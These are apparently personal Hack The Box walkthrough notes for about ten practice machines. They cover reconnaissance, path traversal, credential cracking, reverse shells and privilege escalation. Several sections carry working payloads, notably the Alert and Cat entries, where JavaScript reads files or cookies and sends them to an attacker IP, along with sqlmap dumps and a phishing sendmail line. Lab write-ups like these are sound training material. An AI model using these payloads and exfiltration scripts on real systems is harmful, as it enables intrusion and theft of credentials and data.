
# Machine  : Chemistry 
## User Flag:

- `nmap -A -p- 10.10.11.38` 
- open browser and search for `10.10.11.38:5000`
- Register -> Upload a .cif file that contains a payload to open a reverse shell in pyhton
- `netcat -lvnp 4444` -> click view on the uploaded file 
-  We now have a reverse shell on the app user.
- Go to instance and look for the list of users and their passwords in the db
- perform a reverse MD5 hash lookup --> we found rosa's password
- Login with SSH on rosa's account
- the flag is there.

## Root Flag: 
- From rosa ssh connection `curl localhost:8080 --head` ==> server is aiohttp/3.9.1
- looked for vulnerabilities online ==> found path traversal attack
- `curl -s --path-as-is http://localhost:8080/assets/../../../../../root/root.txt`

# Machine : Underpass
## User Flag: 
- `sudo nmap -sU 10.10.11.48`
- `snmpwalk -v2c -c public 10.10.11.48`
- found daloradius server which made me check the git for daloradius and found a login.php page with this path `/daloradius/app/operators/login.php`
- searched for default login credentials for daloradius "administrator" and "radius" worked
- found a user and it's hashed password => did a reverse lookup on the hash which gave me the password "underwaterfriends"
- connected with ssh `ssh svcMosh@10.10.11.48`
- the user flag is there

## Root Flag
- did sudo -l (explain what this does)
- `mosh --server "sudo /usr/bin/mosh-server" localhost`
- got the root flag

# Machine : Cicada
## User Flag:
- `nmap Â -sV -Pn -sC 10.10.11.35`
- Found the existence of smb network file sharing service
- Try to connect to smb client via `smbclient -L //10.10.11.35` 
- found a list of users and tried to connect to some of them 
- you can connect to HR without a password 
- We find a text file that contains a default password
- used `python3 /usr/bin/lookupsid.py guest@10.10.11.35` tool name :impacket to enumerate the users 
- Tried connecting to multiple users with the default password michael.wrightson worked out => we are gonna use these credentials for the following step
- we will brute-force RIDs to extract additional information using netExec `nxc smb 10.10.11.35 -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users --rid-brute`
- david.orelious has left his password in clear text in his files 
- after connecting to his account we find a backup file containing the password of emily.oscar
- connect to the machine using evil-winrm
- navigate the file system and the user flag is in Desktop
## Root Flag
- execute `whoami /all`
- `SeBackupPrivilege` is enabled
- use the SEBackupPrivilege exploit to escalate the privileges and be administrator

# Machine : Escape Two
## User Flag
- `nmap 10.10.11.51 -sV -Pn -T4`
- `nxc smb 10.10.11.51 -u rose -p 'KxEPkKe6R8su' --users --rid-brute`
- `smbclient -L //10.10.11.51 -U rose` and enter rose's password
- `smbclient "//10.10.11.51/Accounting Department" -U rose` we find two exel files => download them.
- tried using impacket to connect to the sql database but didn't workout for some reason
```bash
mssqlclient.py 10.10.11.51/sa:'MSSQLP@ssw0rd!'@10.10.11.51  
Impacket v0.11.0 - Copyright 2023 Fortra  
[*] Encryption required, switching to TLS  
[-] ERROR(DC01\SQLEXPRESS): Line 1: Login failed for user 'sa'.
```
- Im going to try metasploit:
	1. `msfconsole`
	2. `search mssql exec`
	3. `use auxiliary/admin/mssql/mssql_exec`
	4. set options to what we need
	5. by setting the CMP back and forth to things like `cd ../.. & dir` i was able to explore the machine and found a directory at the root named SQL2019 and found a .INI file that contained  interesting information
	6. (info impacket didn't work because someone changed the password of sa probably after getting root acces haha so it should work after all and we should be able to spawn a reverse shell to explore the machine but i found my technique easier to understand and to do)
	7. we found a password and we're going to try using it to connect to one of the accounts
- Connect to ryan and find the user flag.

## Root Flag
Was not able to do it

# Machine : Alert
## User Flag
- `nmap -sCV 10.10.11.44 -Pn`
- fuzz the website using ffuf `ffuf -w dict.txt -u http://alert.htb -H "Host:FUZZ.alert.htb" -ac `
- Inject this payload as an md file 
```js
<script>
  // Step 1: Request the secret password file from the target website
  fetch("http://alert.htb/messages.php?file=/var/www/statistics.alert.htb/.htpasswd")
    .then(response => response.text())  // Step 2: Read the file content
    .then(stolenData => {
      // Step 3: Send the stolen data to the attacker's server
      fetch("http://10.10.14.55:9001/?stolen_data=" + encodeURIComponent(stolenData));
    });
</script>
```
- we start an http server `python -m http.server 9001`
- we then send the link that was generated by the viewing of the md file in the contact us section (this was helped by a forum)
- we get an encoded url `10.10.11.44 - - [17/Feb/2025 04:51:28] "GET /?file_content=%3Cpre%3Ealbert%3A%24apr1%24bMoRBJOg%24igG8WBtQ1xYDTQdLjSWZQ%2F%0A%3C%2Fpre%3E%0A HTTP/1.1" 200 -`
- decode the url and we get `albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/
- this is a username and a password hash : used johntheripper to crack the hash
- the password retrieved is "manchesterunited"
- connect to albert and get the unser flag
## Root Flag
- we forward our local ports to the machine using `ssh -L 8080:127.0.0.1:8080 albert@alert.htb`
- then in our browser we go to our local host to find a website monitor
- i then looked for the website monitor related folders on alberts machine  and fount it in the /opt
- one of the directories had write permissions /config which made me able to inject a reverseshell in a php file. 
- i then run on my browser `127.0.0.1:8080/config/revershell.php`
- which opens up a reverse shell for me which makes me able to read the flag 

# Machine : Link Vortex
## User Flag
- start by `sudo nmap -sC -sT -p- -T4 10.10.11.47` (http port open to get foothold and ssh port open to connect)
- when we connect to linkvortex.htb we find a site `BitByBit Hardware`
- Tried first fuzzing to find subdirectories
- we find a bunch of subdirectories one of them being "robots.txt" which contains some subdirectories also , one interesting one is the /ghost one which requires credentials 
- i will now try fuzzing again to find sudomains 
- `ffuf -u http://linkvortex.htb -w /usr/share/wordlists/dirb/common.txt -H "Host: FUZZ.linkvortex.htb" -fc 301`
- when visiting "dev.linkvortex.htb" we get on a launching soon page
- again we try to brute force for some more directories using the same tool
- `ffuf -u http://dev.linkvortex.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt -fs 0` we get a bunch of results. For most we don't have permissions to access but not the .git one
- dumped the git info to my machine 
- There is a dockerfile which will be used later in a vulnerability exploit
- `cat ghost/core/test/regression/api/admin/authentication.test.js` which contains passwords we will try connecting with 
- we go back to the login page we found earlier and try connecting as admin with the password 'OctopiFociPilfer45'
- i was able to find the version of ghost used which was old and vulnerable to CVE-202-40028 which gives files reading permissions
- using the reading permissions we could finally read the file used in the docker file found precendently getting new credentials 
```
        "user": "bob@linkvortex.htb",
        "pass": "fibber-talented-worth"
```
- we connect to that user through ssh and find "37fcd0f7c60672e6716c1cd4f2d80601"
## Root Flag
- we list the commands we can run as sudo as bob `sudo -l`
- we can run /opt/ghost/clean_symlink.sh
- reading the code i see that we can manipulate environment variables and symbolic links just like in nebula here is what we did :
-  create a sumbolic link to /root/root.txt then create a symbolic link to that symbolic link with the .png extension we then run the script while changing the environment variable CHEK_CONTENT to true
- we get the flag content `aa76e850b5821e94ddbada83c95edb36` we do not have root privilege but finding the flag is enough for hackthebox

# Machine : Heal

## User flag
- nmap -sC -sV -Pn 10.10.11.46
- add heal.htb to /etc/hosts
- `ffuf -u http://heal.htb -w /usr/share/wordlists/wfuzz/general/medium.txt -H "Host:heal.htb/FUZZ"
- add api.heal.htb to /etc/hosts
- create account -> login -> survey -> find `take-survey.heal.htb
- add take-survey.heal.htb to /etc/hosts
- `dirsearch -u "http://take-survey.heal.htb/index.php/" -i 200
- find http://take-survey.heal.htb/index.php/admin
- open burp -> proxy -> intercept on open browser
- go to http://heal.htb/resume
- forward -> forward -> copy get request -> Repeater
- Since api.heal.htb tells us that it uses ruby on rails, find config file
- burp -> replace GET request by `GET /download?filename=../../config/database.yml HTTP/1.1
- response -> database: storage/development.sqlite3
- replace GET by `GET /download?filename=../../storage/development.sqlite3 HTTP/1.1
- download the database
- use db Browser (or something else)
- find ralph hash -> use john the ripper -> password is `147258369
- use this exploit : https://github.com/Y1LD1R1M-1337/Limesurvey-RCE
- do the following change : config.xml -> add \<version>6.0\</version>
- do the following change : php-rev.php -> change ip (ip a) and port (4444)
- zip the 3 files config.xml php-rev.php and exploit.py in a single zip file
- go to http://take-survey.heal.htb/index.php/admin -> plugin -> install plugin -> add the zip
- nc -lvnp 4444 -> http://take-survey.heal.htb/upload/plugins/Y1LD1R1M/php-rev.php
- open a reverse shell -> cat `/var/www/limesurvey/application/config/config.php`
- find password to ron : `AdmiDi0_pA$$w0rd`
- cat user.txt -> `048c541dbf0b7d86e3da822265b4a55f
## Root flag

- `netstat -tuln` -> find port open
- on own machine, do `ssh -L 8500:127.0.0.1:8500 ron@heal.htb
- find this exploit `https://www.exploit-db.com/exploits/51117`
- `nc -lvnp 6666
- `python exploit.py 127.0.0.1 8500 x.x.x.x(replace with your ip) 6666 0`
- `cat ~/root.txt` -> `3b9b0fef9009baf36248c0e04a0c1ff2

# Machine : Titanic
## User Flag
- `nmap -sC -sV -Pn 10.10.11.55`
- add titanic.htb to my hosts as 10.10.11.55
- after browsing the website every button doesn't work except the "book now" button
- trying to book downloads a json file containing the book info
- try fuzzing for subdomains, just like in linkvortex we find a dev subdomain
`ffuf -u "http://titanic.htb" -H "Host: FUZZ.titanic.htb" -w /usr/share/wordlists/dirb/common.txt -fc 301`
- the dev subdomain leads us to a gitea page (version 1.22.1)
- we can register and explore the public repos (ther is 2)
- got stuck a bit here so checked the forum and apparently one attack vector is the download of the json file when booking 
- i opened the network section of firefox's debuggerto find the GET request being made with this url `http://titanic.htb/download?ticket=17da9336-06ae-4d51-9f92-e28091049a78.json`
- tried to see if there was a path traversal vulnerability which there was 
`curl http://titanic.htb/download?ticket=../../../../etc/passwd`
- we find a user named developer so we exploit the same vulnerability to check if he has the user flag 
```
 curl http://titanic.htb/download ticket=../../../../home/developer/user.txt
c099ef7871a5e6700927bc12a9033146
```

this does not work to retrieve the root flag
## Root flag
- We will use the 2 git repos we found in the userflag quest. 
- we have some credentials for a MySQL database in `docker-config/mysql/docker-compose.yml` which is only enabeled for localhost
- we can see in `docker-config/gittea/docker-compose.yml` the volume configuration is different from the usual configuration for gitea we can find in the documentation in a way that everything written in /data/ in the container will appear in /home/developer/gitea/data on the host and since gitea will create the /data/gitea/ which means we should have something like "home/user/gitea/data/gitea/..."
- the configuration fiel for gitea should be in /data/gitea/conf/app.ini so here it would be at /gitea/data/gitea/conf/app.ini `curl http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/conf/app.ini`
- we could find the path to the database in the app.ini so we are going to try and git it ( the path being /data/gitea/gitea.db normally it should be /gitea/data/gitea/gitea.db)`curl -o gitea.db http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db`
- we use sqlite3 to go through the database
- it seems like the passwords are stored using pkdf2 i will try to see if there is a way to brute force it
- Wrote a script to emulate the key-derivation to PKDF2 on the rockyou wordlist. ==> the password was cracked for developper `25282528`
- we connect to developer account through SSH
- we find a root owned script in /opt/scripts that is executable for everyone 
- the script seems to run at a certain interval (date of metadata.log changing )
- checked the image magik doc (https://imagemagick.org/script/magick-script.php)
- multiple CVE's found (https://cert.ssi.gouv.fr/avis/CERTFR-2016-AVI-154/)
- the version installed on this machine is 7.1.1-35 
- [CVE-2024-41817](https://www.cvedetails.com/cve/CVE-2024-41817/ "CVE-2024-41817 security vulnerability details") might be an attack vector
- The CVE describes an exploit that could hijack the shared library path LD_LIBRARYPATH by creating a malicious library to open a reverseshell as root 
- The script uses __attribut__((constructor)) to make GCC run the fucntion before the execution of main.
- i then `objdump -p /usr/bin/magick` to see what libraries are needed to run the binary (we are going to use libdl.so.2 here)
- we then compile into a shared library and and move it into the directory where the binary is placed 
- we create a new jpg file to make the script run => we run the suid executable 
- wooooo we are groot ==> "1c1b50f8415331896967a2b501b97866"

# Machine : Instant
## User flag

- nmap -sC -sV -Pn 10.10.11.37
- add instant.htb to /etc/hosts
- go to website -> download
- To search for subdomain, grep -r -i subdomain. I find two subdomains : `mywalletv1.instant.htb` & `swagger-ui.instant.htb`
- add them to /etc/hosts
- go to `swagger-ui.instant.htb`
- using the api, try to register a new user -> protected
- We need to be an admin -> grep -r -i admin
- we go visit each of the files (there's only 3)
- inside `smali/com/instantlabs/instant/AdminActivities.smali` we have the method `TestAdminAuthorization()` which contains the authorization token.
- go back to website -> register token -> unlock admin api rights
- test -> create a user -> it works
- We have the function `/api/v1/admin/read/log`
- Inside, we have an example with a name, shirohige
- I try multiple ways to access stuff, finally, i come across : 
`../../../../../../../home/shirohige/.ssh/id_rsa`
- I get the ssh key -> i log with `ssh -i id_rsa shirohige@instant.htb`
- I get the user flag : `8c0aae4f74c8096c60306a49bae1cc5f
## Root flag
- I try to find useful files, i find /opt/backups/Solar-PuTTY
- I look on internet and find solar putty cracker
- i use the script, and i get the root flag : `12**24nzC!r0c%q12
- i log as root and get the root flag : `d8735de6e104fb6e96a02d008f87f700`

# Machine : Cat

## User Flag
- `sudo nmap -sC -sT -p- -T4 10.10.11.53`
- we find an http website (cat.htb) 
- We can create an account and login
- we can enter the contest by entering cat infos and uploading a picture (the upload might be an attack vector)
- tried fuzzing for subdirectories and found some tracks 
`ffuf -u http://cat.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt -fs 0`
- there was a .git subdirectory so i used git-dumper to get the info in my machine
- i grep for usernames and passwords to see if i can find any usefull information in the git file (equality tests etc)
- i find the username axel quite often in checks which might mean that axel has admin privileges 
- i also found out that md5 was used to process the password which could be an attack vector
- if i `git log` i can get infos on the repo and axels email `axel2017@gmail.com`
- there is a sql database at /databases/cat.db config.php handles its configuration
- contest.php hanles user submissions for the cat contest
- admin.php is the administration panel for cats ( potential XSS vulnerability (untested yet))
- view_cat.php also seems to have a potential XSS vuln since it echos user input without verification.
- after carefull reading of the code im going to try to inject some SQL code via the catname but won't work because there is sanitization in contest.php :(
- <script>document.location='http://10.10.14.124/?c='+document.cookie;</script> 
- o7hrcras4j58qb3reao12u0ntq
- this gives us acces when we modify our cookies in our browser to the admin apge to accept/deny cats
- used this command (source forum)
`sqlmap -u "http://cat.htb/accept_cat.php" --data "catId=1&catName=mal" --cookie="PHPSESSID=o7hrcras4j58qb3reao12u0ntq" -p catName --level=5 --risk=3 --dbms=SQLite --dump`
- this dumps the user table which contains hashes for passwords 
- rosa's password is reversible and translates to `soyunaprincesarosa`
- we can finally connect to rosa by ssh
- we can access the apache server logs if we grep by axel we find the password he used to log
```
rosa@cat:/var/log/apache2$ cat access.log  | grep axel
127.0.0.1 - - [18/Feb/2025:15:24:09 +0000] "GET /join.php?loginUsername=axel&loginPassword=aNdZwgC4tI9gnVXv_e3Q&loginForm=Login HTTP/1.1" 302 329 "http://cat.htb/join.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0"

```
- `su axel`
- user flag is in his home directory `f6b99b039505891b276492cfc84e59e3`
## Root flag
- when logging to axel we have a message pop up saying we have mail
- the mail basically says that we have to check a privately hosted git repository at `http://localhost:3000/administrator/Employee-management/.` and that jobert will check the description of the project i want to create
- i will try to forward some ports to access the repo
- i now have access to the git (version 1.22.0 which is vulnerable to # [CVE-2024-6886](https://www.cvedetails.com/cve/CVE-2024-6886/ "CVE-2024-6886 security vulnerability details"))
- we are going to try to inject a malicious payload through creating a new repo (the description might be the attck vector)
- i treidn injecting a payload that fetches the index.php page in the description because it's the one that contains the login information that is being compared with at login 
```html
<a href="javascript:fetch('http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php')
.then(response => response.text())
.then(data => fetch('http://10.10.14.124/?resp=' + encodeURIComponent(data)))
.catch(error => console.error('Error:', error));">click</a>
```
- we then trick the admin to click the link via the info provided in the mail
`echo -e "Subject: exploit \n\n yo check this out http://localhost:3000/axel/yoyo" | sendmail jobert@localhost`
- while listening with an http server we recieve the response which is encoded => after decoding we ge the password of admin
```
$valid_username = 'admin';
$valid_password = 'IKw75eR0MR7CMIxhH0';
```
- we can now connect as root and find the flag `ab99bb0cf7dfc9b9b27469aa6f4df3bb`
